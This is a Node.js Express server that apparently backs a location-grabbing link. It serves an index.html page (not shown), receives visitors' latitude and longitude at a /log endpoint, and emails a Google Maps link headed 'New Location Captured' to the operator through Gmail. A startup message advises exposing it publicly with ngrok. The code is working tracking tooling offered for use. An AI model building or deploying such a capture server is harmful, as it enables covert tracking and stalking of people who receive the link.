// server.js
require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// ✅ Serve static files (your index.html)
app.use(express.static(path.join(__dirname)));

// ✅ Root route will serve index.html automatically
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ✅ Route to receive location data
app.post("/log", (req, res) => {
  const { lat, lng, timestamp } = req.body;

  if (typeof lat !== "number" || typeof lng !== "number") {
    return res.status(400).json({ error: "Invalid or missing lat/lng" });
  }

  const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
  console.log(`[${new Date(timestamp || Date.now()).toISOString()}] Location received: ${lat}, ${lng}`);

  // Email credentials
  const EMAIL_USER = process.env.EMAIL_USER;
  const EMAIL_PASS = process.env.EMAIL_PASS;
  const EMAIL_TO = process.env.EMAIL_TO || EMAIL_USER;

  if (!EMAIL_USER || !EMAIL_PASS) {
    console.warn("⚠️ Email credentials not set. Skipping email.");
    return res.status(200).json({
      message: "Location received (email not sent - missing credentials)",
      link: mapLink
    });
  }

  // Setup transporter
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: EMAIL_USER,
      pass: EMAIL_PASS
    }
  });

  // Mail content
  const mailOptions = {
    from: EMAIL_USER,
    to: EMAIL_TO,
    subject: "📍 New Location Captured",
    text: `User Location: ${mapLink}`
  };

  // Send email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("❌ Email Send Error:", error);
      return res.status(500).json({ error: "Email failed to send" });
    } else {
      console.log("✅ Email sent:", info.response || info);
      return res.status(200).json({
        message: "Location received and email sent",
        link: mapLink
      });
    }
  });
});

// Start server
const port = process.env.PORT || 4000;
app.listen(port, () => {
  console.log(`🚀 Server running on http://localhost:${port}`);
  console.log(`🔗 Use with Ngrok: ngrok http ${port}`);
});